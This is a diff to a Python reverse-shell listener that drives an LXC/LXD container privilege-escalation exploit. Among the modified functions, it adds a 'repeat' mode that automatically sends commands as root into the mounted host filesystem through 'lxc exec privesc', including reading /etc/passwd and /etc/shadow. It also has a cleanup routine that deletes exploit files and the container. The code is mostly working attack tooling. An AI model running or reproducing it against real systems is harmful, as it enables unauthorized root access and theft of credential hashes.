@@ -5,7 +5,7 @@ import threading
 # I utilized as base code for this listener the code found on:
 # https://tpetersonkth.github.io/2021/10/16/Creating-a-Basic-Python-Reverse-Shell-Listener.html
 
-def listen(ip,port, t2, r_port, file_name, general_info):
+def listen(ip,port, t2, r_port, file_name, general_info, arguments):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.bind((ip, port))
 	s.listen(1)
@@ -13,10 +13,13 @@ def listen(ip,port, t2, r_port, file_name, general_info):
 	con = None
 	conn, addr = s.accept()
 	print('Connection received from ',addr)
-	print('=================================================')
-	print('=                Reverse Shell                  =')
-	print('=================================================')
-	print('$', end=" ") # The shell does not print the first $, so in order not to confuse the user I decided to print it
+	
+	# Dont print Banner if in repeat mode
+	if arguments.repeat == None:
+		print('=================================================')
+		print('=                Reverse Shell                  =')
+		print('=================================================')
+		print('$', end=" ") # The shell does not print the first $, so in order not to confuse the user I decided to print it
 	try:
 		
 		t2.start() # This threads will be daemon, however they will close once the main thread closes, so we don't run into the problem of keeping it always on
@@ -43,45 +46,68 @@ def listen(ip,port, t2, r_port, file_name, general_info):
 			conn.send(cmd.encode())
 			time.sleep(0.2)
 			sys.stdout.write("\033[A" + ans.split("\n")[-1])
-		print('''
+			
+		# Dont print Banner if on repeat mode
+		if arguments.repeat == None:
+			print('''
+			
+			################################################################
+			#							       #
+			#                       Explanation			       #
+			#							       #
+			################################################################
+			
+			In order to have the concept of session, make compound commands.
+			Example, if you wanted to list the contents of /tmp
+			cd /tmp && ls -la
+			
+			Otherwise if you type:
+			cd /tmp
+			ls -la
+			
+			It will list the contents of directory you were when executing cd /tmp
+			''')
 		
-		################################################################
-		#							       #
-		#                       Explanation			       #
-		#							       #
-		################################################################
-		
-		In order to have the concept of session, make compound commands.
-		Example, if you wanted to list the contents of /tmp
-		cd /tmp && ls -la
-		
-		Otherwise if you type:
-		cd /tmp
-		ls -la
-		
-		It will list the contents of directory you were when executing cd /tmp
-		''')
-		
-		while True:
-			#Receive data from the target and get user input
+		# If on repeat mode, just execute some commands and exit
+		# otherwise allow the user to mess around with terminal
+		if arguments.repeat == None:
+			while True:
+				#Receive data from the target and get user input
 
-			ans = recvall(conn)
-			sys.stdout.write(ans)
-			command = input()
+				ans = recvall(conn)
+				sys.stdout.write(ans)
+				command = input()
 
-			# Send command with 'lxc exec privesc -- sh -c "cd /mnt/root"', in order to execute the command inside the container
-			# cd /mnt/root is always forced because the filesystem was mounted at this point, that way the user will always be poiting to the root
-			# Since we between commands we lose the concept of session, its always force so we can start from the exact same point
+				# Send command with 'lxc exec privesc -- sh -c "cd /mnt/root"', in order to execute the command inside the container
+				# cd /mnt/root is always forced because the filesystem was mounted at this point, that way the user will always be poiting to the root
+				# Since we between commands we lose the concept of session, its always force so we can start from the exact same point
+				
+				
+				if command != "":
+					command = "lxc exec privesc -- sh -c \"cd /mnt/root/ && " + command + "\""
+				
+				command += '\n'
+				conn.send(command.encode())
+				time.sleep(0.4)
+				sys.stdout.write("\033[A" + ans.split("\n")[-1])
+				print("")
+		else:
+			# Do some random commands while root on the lxc container
+			commands = ['pwd\n', 'ls -la\n', 'whoami\n', 'ls -la | grep root | awk \'{ print $9 }\' | head -1 \n', 'which php\n', 'cat /etc/passwd\n', 'cat /etc/shadow\n']
+			for cmd in commands:
+				ans = recvall(conn)
+				command =  "lxc exec privesc -- sh -c \"cd /mnt/root/ && " + cmd
+				conn.send(command.encode())
+				time.sleep(0.3)
+			print('\n[-] Unbinding...')
+			# Cleanup
+			cleanup(conn, file_name, general_info)
+			time.sleep(0.2)
+			conn.close()
+			s.close()
+			conn.close()
+			print('[*] Ended exploit')
 			
-			
-			if command != "":
-				command = "lxc exec privesc -- sh -c \"cd /mnt/root/ && " + command + "\""
-			
-			command += '\n'
-			conn.send(command.encode())
-			time.sleep(0.4)
-			sys.stdout.write("\033[A" + ans.split("\n")[-1])
-			print("")
 	except KeyboardInterrupt:
 		if conn:
 			print('\n[-] Unbinding...')
@@ -92,7 +118,7 @@ def listen(ip,port, t2, r_port, file_name, general_info):
 			s.close()
 	conn.close()
         
-def listen_shell(ip, port, v_ip, v_port, general_info):
+def listen_shell(ip, port, v_ip, v_port, general_info, arguments):
 	r_port = random.randint(1024, 65536)
 	# Making sure the random port is not in use
 	while check_port(ip, r_port):
@@ -101,7 +127,7 @@ def listen_shell(ip, port, v_ip, v_port, general_info):
 	t1 = threading.Thread(target=task, args=(v_ip, v_port))
 	t2 = threading.Thread(target=task2, args=(ip, r_port))
 	t1.start()
-	listen(ip, int(port), t2, r_port, get_file_name(), general_info)
+	listen(ip, int(port), t2, r_port, get_file_name(), general_info, arguments)
 	
 def task(v_ip, v_port):
 
@@ -179,12 +205,13 @@ def recvall(sock):
 def cleanup(conn, file_name, general_info):
 	conn.send('rm -f *.tar.gz exploit.sh; lxc delete privesc --force;'.encode())
 	print('[DEBBUG] ' + 'wget -O /dev/null \'' + informAudittingStop(general_info) + '\'"$(ps aux | grep www-data | grep "sh -i" | awk \'{print $2 }\' | sed -n 2p)"')
-	try:
-		requests.get('http://'+ informAudittingStop(general_info) + '3232', timeout=(1,1)) # Pid here doenst really matter
-	except requests.exceptions.ReadTimeout:
-	    		pass
-	except requests.exceptions.ConnectTimeout:
-	    	sys.exit('[-] Failed to connect to Logging server')
+	if general_info['active'] == 'True':
+		try:
+			requests.get('http://'+ informAudittingStop(general_info) + '3232', timeout=(1,1)) # Pid here doenst really matter
+		except requests.exceptions.ReadTimeout:
+		    		pass
+		except requests.exceptions.ConnectTimeout:
+		    	sys.exit('[-] Failed to connect to Logging server')
 	if os.path.exists(file_name):
 		os.remove(file_name)
 	if os.path.exists('build-alpine'):
